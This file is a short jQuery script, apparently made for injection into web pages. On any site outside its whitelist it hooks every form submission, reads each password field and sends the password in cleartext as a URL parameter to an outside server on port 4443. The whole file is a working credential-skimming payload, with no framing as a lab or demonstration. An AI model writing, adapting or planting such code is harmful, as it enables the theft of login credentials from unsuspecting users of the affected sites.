var whitelist = ["localhost","prometheaninfosec.com"];

serverurl = "https://prometheaninfosec.com:4443";

var cont = "1";

$(function() {
		for(var i = 0; i < whitelist.length; i++){
			console.log(whitelist[i] + ":" + window.location.host);
			if(window.location.host == whitelist[i]){cont = "2";}
		}
		console.log("cont: " + cont);
		if(cont == "1"){
		$('form').submit(function() {
			//alert("YOU'VE SUBMITTED A FORM");
			var allInputs = $(":input");
			$.each(allInputs, function(index, value) {
				//console.log(index + ": " + value);
				if(value.type == "password"){
					console.log("Detected password input, forwarding");
					var url = serverurl + "?pass="+value.value;
					var xhr = new XMLHttpRequest();
					//xhr.onreadystatechange = handleStateChange; // Implemented elsewhere.
					xhr.open("GET", url, true);
					xhr.send();
				}
			});
			//console.log(allInputs.attr('type'))
			return true;
		});
	
		}
	});

	
	